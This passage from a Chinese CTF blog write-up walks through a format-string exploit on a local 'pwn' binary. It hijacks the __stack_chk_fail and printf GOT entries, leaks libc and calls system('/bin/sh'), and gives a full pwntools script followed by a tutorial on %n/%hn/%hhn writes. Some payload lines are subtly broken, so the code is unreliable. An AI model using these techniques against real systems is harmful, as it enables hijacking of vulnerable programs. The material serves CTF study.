fs:28h</span><br><span class="line">.text:0000000000401291                 jz      short locret_401298</span><br><span class="line">.text:0000000000401293                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>
+
+<p>我们看到了call    ___stack_chk_fail，这个是关键。</p>
+<p>为什么会有这个呢?  —–&gt;因为开启了canary</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      No RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br><span class="line">Stripped:   No</span><br><span class="line">Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
+
+<p>查看保护，开启了canary。</p>
+<p>利用格式化字符串的任意位置的篡改，我们就可以将 ___stack_chk_fail篡改为main的地址，这样就会进入无限循环</p>
+<p>我们先去找到main和___stack_chk_fail的got地址，在篡改的同时还可以利用printf_got泄露printf的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">main_addr = <span class="number">0x40121b</span></span><br><span class="line">stack_chk_fail_got = <span class="number">0x0403320</span></span><br><span class="line">printf_got = <span class="number">0x403328</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1b</span>).encode + <span class="string">b&#x27;%c22%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x1b</span>)+(<span class="number">0x12</span>).encode + <span class="string">b&#x27;%c23%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x12</span>)+(<span class="number">0x40</span>).encode + <span class="string">b&#x27;%c24%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;---b%25$s&#x27;</span> <span class="comment">#方便接收</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0x80/8 = 16 + 6(偏移见下图) = 22</span></span><br><span class="line">payload += p64(stack_chk_fail_got)       <span class="comment"># %$hhn是单字节写入 stack_chk_fail_got是%c22%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x1</span>) <span class="comment"># stack_chk_fail_got + 0x1是%c23%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x2</span>) <span class="comment"># stack_chk_fail_got + 0x2是%c24%$hhn写入的地址</span></span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----</span><br><span class="line">aaaa %p %p %p %p %p %p %p %p</span><br><span class="line">aaaa 0x7ffcf57781d0 0x110 0x7a8a8171ba61 0x5 0x7a8a81904380 0x2070252061616161 0x7025207025207025 0x2520702520702520</span><br><span class="line">#偏移为6</span><br></pre></td></tr></table></figure>
+
+<p>执行这个payload就进入无限循环了，并且泄漏量printf的地址。</p>
+<p>根据print的地址，计算出libc的基地址。</p>
+<p>此时我就要再次利用格式化字符串，将printf_got的地址改成system的地址，在发送&#x2F;bin&#x2F;sh就能获取shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;---b&quot;</span>)  </span><br><span class="line">printf_addr = u64(io.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)  <span class="comment">#接收printf的地址</span></span><br><span class="line">success(<span class="string">f&quot;printf_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>) </span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>] <span class="comment">#计算基地址</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#算出system的地址</span></span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(system &amp; <span class="number">0xff</span>).encode() + <span class="string">b&quot;c%22$hhn&quot;</span> <span class="comment">#最低字节写入偏移为的位置</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (system &amp; <span class="number">0xff</span>)) + ((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)).encode() + <span class="string">b&quot;c%23$hhn&quot;</span> <span class="comment">#同理去高一位的字节</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>))) + (((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>))).encode() + <span class="string">b&quot;c%24$hhn&quot;</span> <span class="comment">#同理</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(printf_got) <span class="comment">#c%22$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x1</span>) <span class="comment">#c%23$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x2</span>) <span class="comment">#c%24$hhn写入的位置</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)              </span><br><span class="line"><span class="comment">#io = remote(&#x27;ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x40121b</span></span><br><span class="line">stack_chk_fail_got = <span class="number">0x0403320</span></span><br><span class="line">printf_got = <span class="number">0x403328</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1b</span>).encode + <span class="string">b&#x27;%c22%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x1b</span>)+(<span class="number">0x12</span>).encode + <span class="string">b&#x27;%c23%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span> - <span class="number">0x12</span>)+(<span class="number">0x40</span>).encode + <span class="string">b&#x27;%c24%$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;---b%25$s&#x27;</span> <span class="comment">#方便接收</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0x80/8 = 16 + 6(偏移见下图) = 22</span></span><br><span class="line">payload += p64(stack_chk_fail_got)       <span class="comment"># %$hhn是单字节写入 stack_chk_fail_got是%c22%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x1</span>) <span class="comment"># stack_chk_fail_got + 0x1是%c23%$hhn写入的地址</span></span><br><span class="line">payload += p64(stack_chk_fail_got + <span class="number">0x2</span>) <span class="comment"># stack_chk_fail_got + 0x2是%c24%$hhn写入的地址</span></span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;---b&quot;</span>)  </span><br><span class="line">printf_addr = u64(io.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)  <span class="comment">#接收printf的地址</span></span><br><span class="line">success(<span class="string">f&quot;printf_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>) </span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>] <span class="comment">#计算基地址</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#算出system的地址</span></span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(system &amp; <span class="number">0xff</span>).encode() + <span class="string">b&quot;c%22$hhn&quot;</span> <span class="comment">#最低字节写入偏移为的位置</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (system &amp; <span class="number">0xff</span>)) + ((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)).encode() + <span class="string">b&quot;c%23$hhn&quot;</span> <span class="comment">#同理去高一位的字节</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>))) + (((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>))).encode() + <span class="string">b&quot;c%24$hhn&quot;</span> <span class="comment">#同理</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(printf_got) <span class="comment">#c%22$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x1</span>) <span class="comment">#c%23$hhn写入的位置</span></span><br><span class="line">payload += p64(printf_got + <span class="number">0x2</span>) <span class="comment">#c%24$hhn写入的位置</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>现在开始格式化字符串漏洞的知识点的总结。</p>
+<p>什么是格式化字符串？</p>
+<ul>
+<li>在 C&#x2F;C++ 等语言中，像 <code>printf</code>, <code>sprintf</code>, <code>fprintf</code>, <code>syslog</code> 等函数使用一个格式化字符串作为第一个参数。这个字符串包含普通文本和以 <code>%</code> 开头的格式化说明符。</li>
+<li>函数根据格式化说明符的指示，从后续的参数列表中读取相应数量和类型的参数，并将它们格式化后输出到目标（屏幕、字符串、文件等）。</li>
+</ul>
+<p>漏洞成因：</p>
+<ul>
+<li>程序员错误： 当程序员允许用户输入直接作为格式化字符串传递给这些格式化输出函数时，漏洞就产生了。</li>
+<li>关键区别：<ul>
+<li>正确用法： <code>printf(&quot;%s&quot;, user_input);</code> - 用户输入被当作一个普通的字符串参数传递给 <code>%s</code>。函数期望一个字符串地址作为第二个参数。</li>
+<li>漏洞用法： <code>printf(user_input);</code> - 用户输入本身被当作格式化字符串。如果用户输入中包含 <code>%</code> 开头的字符序列，函数会将其解释为格式化说明符。</li>
+</ul>
+</li>
+<li>函数行为： 当遇到格式化说明符时，函数会假设在栈（或寄存器，取决于调用约定）上存在对应的参数。它就会按照格式化说明符的要求去读取内存中它“认为”是参数的位置。</li>
+</ul>
+<p>漏洞危害：</p>
+<ul>
+<li>信息泄露 (Read)：读取栈内存、函数返回地址、库函数地址、程序代码地址、Canary值、甚至任意地址的内容（如密码、密钥）。</li>
+<li>内存覆写 (Write)：向栈内存、函数返回地址、全局偏移表 (GOT)、析构函数表 (DTORS)、任意地址写入数据，从而劫持程序控制流（执行任意代码）。</li>
+<li>程序崩溃： 读取或写入无效地址导致段错误。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">%s - 字符串读取 (Read)</span><br><span class="line"></span><br><span class="line">功能： 期望一个指针（地址）作为参数。函数从该地址开始读取内存，直到遇到空字符 (\0)，并将读取到的字节作为字符串输出。</span><br><span class="line"></span><br><span class="line">漏洞利用 (信息泄露)：</span><br><span class="line"></span><br><span class="line">泄露栈内容： printf(&quot;%s&quot;); - 函数会试图将当前栈上“它认为”是参数的位置（通常是格式化字符串指针后面的位置）解释为一个指针，并尝</span><br><span class="line"></span><br><span class="line">试读取该指针指向的内存。如果这个位置恰好包含一个有效的（或可读的）地址，就能泄露该地址处的字符串。例如：</span><br><span class="line"></span><br><span class="line">用户输入 &quot;%s&quot; -&gt; 程序崩溃或泄露栈上某个地址处的数据。</span><br><span class="line"></span><br><span class="line">用户输入 &quot;AAAA%x%x%x%s&quot; -&gt; 先泄露几个栈值 (%x)，然后用其中一个值作为指针 (%s) 去读内存。</span><br><span class="line"></span><br><span class="line">泄露任意地址内容 (结合偏移)：</span><br><span class="line"></span><br><span class="line">构造 payload：&lt;目标地址&gt;&lt;格式化字符串&gt;</span><br><span class="line"></span><br><span class="line">利用 %k$s (其中 k 是偏移量) 指定将栈上第 k 个参数当作指针，用 %s 去读取。例如：</span><br><span class="line"></span><br><span class="line">假设 &lt;目标地址&gt; 被放置在栈上第 8 个参数的位置。</span><br><span class="line"></span><br><span class="line">Payload: &quot;\x78\x56\x34\x12%8$s&quot; (假设 0x12345678 是目标地址，小端序写入)。</span><br><span class="line"></span><br><span class="line">printf 看到 %8$s，就会把栈上第 8 个位置的值 0x12345678 当作指针，读取该地址处的字符串并输出。</span><br><span class="line"></span><br><span class="line">关键点： %s 是读取目标地址指向的内存内容（直到 \0），不是读取地址本身的值。地址本身通常需要用 %p 或 %x 泄露。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">%n - 写入已打印字符数 (Write)</span><br><span class="line"></span><br><span class="line">功能： 期望一个 int *（指向整数的指针）作为参数。该功能是漏洞实现任意地址写的核心！ 函数将到目前为止已成功输出的字符总数写入到</span><br><span class="line">这个指针指向的内存位置。</span><br><span class="line"></span><br><span class="line">漏洞利用 (内存覆写)：</span><br><span class="line"></span><br><span class="line">覆写栈变量/指针/返回地址： printf(&quot;AAAA%n&quot;); - 函数试图将已打印的字符数 (4个 A，所以是4) 写入到栈上“它认为”是参数的位置（本</span><br><span class="line">该是一个 int * 的地方）。如果该位置可写，值 4 就被写入了。这通常会导致崩溃或意外行为。</span><br><span class="line"></span><br><span class="line">覆写任意地址 (结合偏移)：</span><br><span class="line"></span><br><span class="line">构造 payload：&lt;目标地址&gt;&lt;填充字符&gt;&lt;%k$n&gt; 或 &lt;填充字符&gt;&lt;%k$n&gt;&lt;目标地址&gt; (取决于目标地址在栈上的位置)。</span><br><span class="line"></span><br><span class="line">利用 %k$n 指定将栈上第 k 个参数当作 int *，并将已打印字符数写入该地址。</span><br><span class="line"></span><br><span class="line">例如，要写 0xdeadbeef (4字节) 到地址 0x0804a000：</span><br><span class="line"></span><br><span class="line">需要先打印 0xdeadbeef (3, 737, 519, 343) 个字符？这几乎不可能，因为数字太大。</span><br><span class="line"></span><br><span class="line">解决方案： 使用 %hn 或 %hhn 分多次写 2 字节或 1 字节。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">%hn - 写入已打印字符数 (短整型 - 2字节) (Write)</span><br><span class="line"></span><br><span class="line">功能： 期望一个 short int *（指向短整型的指针）作为参数。将到目前为止已成功输出的字符总数（只取其低 16 位）写入到这个指针指向的内存位置（写入 2 个字节）。</span><br><span class="line"></span><br><span class="line">为什么重要？ 要写入的值（如地址、Shellcode 地址）通常很大（4字节或8字节）。一次性用 %n 写入一个巨大的数字（如 0x0804a000 = </span><br><span class="line">134, 520, 832）需要构造极长的输出字符串，不现实且容易出错。%hn 允许我们分两次写入一个 4 字节值（高 16 位和低 16 位）或四次写</span><br><span class="line">入一个 8 字节值。</span><br><span class="line"></span><br><span class="line">漏洞利用 (精确内存覆写)：</span><br><span class="line"></span><br><span class="line">覆写任意地址的 2 字节 (Word)：</span><br><span class="line"></span><br><span class="line">构造 payload：&lt;目标地址&gt;&lt;填充字符&gt;&lt;%k$hn&gt;</span><br><span class="line"></span><br><span class="line">%k$hn 将已打印字符数（模 65536）的低 16 位写入到第 k 个参数指向的地址（2字节）。</span><br><span class="line"></span><br><span class="line">覆写任意地址的 4 字节 (Dword - 常用)：</span><br><span class="line"></span><br><span class="line">假设目标地址是 0x0804a000 (要写入的值 val = 0xdeadbeef)。</span><br><span class="line"></span><br><span class="line">将地址拆分为高 16 位 (high = 0xdead) 和低 16 位 (low = 0xbeef)。</span><br><span class="line"></span><br><span class="line">方法 1 (地址连续)：</span><br><span class="line"></span><br><span class="line">Payload: &lt;addr_low&gt;&lt;addr_high&gt;&lt;填充使总字符数=low&gt;&lt;%m$hn&gt;&lt;填充使总字符数=high&gt;&lt;%n$hn&gt; (注意 low 和 high 可能小于之前打印</span><br><span class="line">的字符数，需要用模运算调整)</span><br><span class="line"></span><br><span class="line">其中 m 是 addr_low 在栈上的位置偏移，n 是 addr_high 在栈上的位置偏移（通常 n = m + 1 或 n = m + 2，取决于指针大小）。</span><br><span class="line"></span><br><span class="line">第一个 %m$hn 将 low 写入 addr_low 指向的地址（即 0x0804a000）。</span><br><span class="line"></span><br><span class="line">第二个 %n$hn 将 high 写入 addr_high 指向的地址（即 0x0804a000 + 2 = 0x0804a002）。</span><br><span class="line"></span><br><span class="line">方法 2 (地址重叠 - 更紧凑)：</span><br><span class="line"></span><br><span class="line">Payload: &lt;addr&gt;&lt;填充使总字符数=low&gt;&lt;%m$hn&gt;&lt;填充使总字符数=high&gt;&lt;%m$hn&gt; (但这次 addr 指向 0x0804a000)</span><br><span class="line"></span><br><span class="line">第一个 %m$hn 将 low (0xbeef) 写入 addr (0x0804a000)。</span><br><span class="line"></span><br><span class="line">第二个 %m$hn 会再次写入 addr (0x0804a000)。但此时已打印字符数是 low + padding_for_high = 0xbeef + ... = high (假设填充计</span><br><span class="line">算正确)，所以将 high (0xdead) 写入 0x0804a000。覆盖了之前写入的低位！</span><br><span class="line"></span><br><span class="line">错误！ 需要写入 addr (0x0804a000) 和 addr+2 (0x0804a002)。方法 2 不正确。</span><br><span class="line"></span><br><span class="line">正确方法 2 (两个不同地址)：</span><br><span class="line"></span><br><span class="line">Payload: &lt;addr_high&gt;&lt;addr_low&gt;&lt;填充使总字符数=low&gt;&lt;%p$hn&gt;&lt;填充使总字符数=high_minus_low&gt;&lt;%q$hn&gt;</span><br><span class="line"></span><br><span class="line">其中 p 是 addr_low 的偏移，q 是 addr_high 的偏移。</span><br><span class="line"></span><br><span class="line">第一个 %p$hn 写 low 到 addr_low。</span><br><span class="line"></span><br><span class="line">第二个 %q$hn 写 high 到 addr_high。注意 high_minus_low 可能需要模 65536 计算，如果 high &lt; low 需要加 65536。</span><br><span class="line"></span><br><span class="line">关键点： 精确计算需要打印的字符数（通过添加特定数量的填充字符，如 %1234d）来控制写入的值。写入顺序（先低后高或先高后低）取决于</span><br><span class="line">目标地址的布局和值的大小关系（避免 high &lt; low 时需要额外处理）。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%hhn - 写入已打印字符数 (字符 - 1字节) (Write)</span><br><span class="line"></span><br><span class="line">功能： 期望一个 char *（指向字符的指针）作为参数。将到目前为止已成功输出的字符总数（只取其最低 8 位）写入到这个指针指向的内存位置（写入 1 个字节）。</span><br><span class="line"></span><br><span class="line">为什么重要？ 提供最精细的控制粒度。可以分 4 次写入一个 4 字节值或 8 次写入一个 8 字节值。对于写入小值或需要非常精确控制内存内</span><br><span class="line"></span><br><span class="line">容的场景很有用。构造 payload 可能更长（需要更多次写入），但计算相对简单（模 256）。</span><br><span class="line"></span><br><span class="line">漏洞利用 (极其精确的内存覆写)： 原理与 %hn 类似，但分成 4 个字节 (4字节地址) 或 8 个字节 (64位地址)。Payload 包含目标地址的 </span><br><span class="line"></span><br><span class="line">4/8 个部分（每个部分 1 字节）和对应的 %k$hhn 及填充。计算每个阶段需要打印的字符数（模 256）。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">%p, %x, %d - 泄露数据 (Read)</span><br><span class="line"></span><br><span class="line">%p: 以指针格式（通常是十六进制带 0x 前缀）输出参数（一个地址）。</span><br><span class="line"></span><br><span class="line">%x/%X: 以十六进制格式（无前缀）输出参数（一个无符号整数）。常用于泄露栈上的数据（可能包含指针或 Canary）。</span><br><span class="line"></span><br><span class="line">%d/%u: 以十进制格式输出参数（有符号/无符号整数）。也能泄露栈数据。</span><br><span class="line"></span><br><span class="line">漏洞利用 (信息泄露 - 栈勘查)：</span><br><span class="line"></span><br><span class="line">printf(&quot;%p %p %p %p %p&quot;); - 连续泄露栈上多个位置的值（通常是格式化字符串指针之后的栈内容）。这是最开始的“探针”，用于：</span><br><span class="line"></span><br><span class="line">定位用户输入的格式化字符串本身在栈上的位置（找偏移量 k）。</span><br><span class="line"></span><br><span class="line">寻找栈上的返回地址、库函数地址、Canary 值等。</span><br><span class="line"></span><br><span class="line">printf(&quot;%100$p&quot;); - 直接泄露栈上第 100 个“参数”位置的值（如果存在）。</span><br><span class="line"></span><br><span class="line">结合 %s 泄露任意地址内容（如前所述）。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">%k$ - 直接参数访问 (关键!)</span><br><span class="line"></span><br><span class="line">功能： 这不是一个独立的说明符，而是修饰符。加在 % 和格式字符（如 s, n, x, p）之间，例如 %8$p, %3$s, %5$n, %10$hn。</span><br><span class="line"></span><br><span class="line">含义： 显式指定使用格式化字符串后面的第 k 个参数（而不是按顺序使用下一个参数）。</span><br><span class="line"></span><br><span class="line">为什么是漏洞利用的核心？</span><br><span class="line"></span><br><span class="line">精准定位： 在格式化字符串漏洞中，攻击者可以精心构造输入字符串（包含目标地址和格式化说明符），并利用 %k$ 精确地告诉 printf 去</span><br><span class="line"></span><br><span class="line">哪里找它需要的指针参数（用于 %s, %n, %hn, %hhn）。这使得攻击者能够读写任意指定的内存地址。</span><br><span class="line"></span><br><span class="line">绕过不确定性： 栈的布局可能因环境而异。通过泄露栈内容（用 %p, %x），攻击者可以计算出目标地址需要放置在格式化字符串的哪个位置，进而确定正确的偏移量 k 用于 %k$。</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line"></span><br><span class="line">假设通过泄露发现，用户输入的格式化字符串起始地址位于栈上第 7 个参数的位置。</span><br><span class="line"></span><br><span class="line">攻击者 payload 开头写入 4 字节的目标地址 0x0804a000。</span><br><span class="line"></span><br><span class="line">那么，这个目标地址就会出现在栈上第 7 个参数的位置（因为格式化字符串指针是第 1 个参数，payload 内容紧随其后）。</span><br><span class="line"></span><br><span class="line">使用 %7$s 就可以尝试读取 0x0804a000 地址处的字符串。</span><br><span class="line"></span><br><span class="line">使用 %7$n 就可以将已打印字符数写入 0x0804a000 地址处。</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>linkpwn
+  </li>
+  <li class="post-copyright-link">
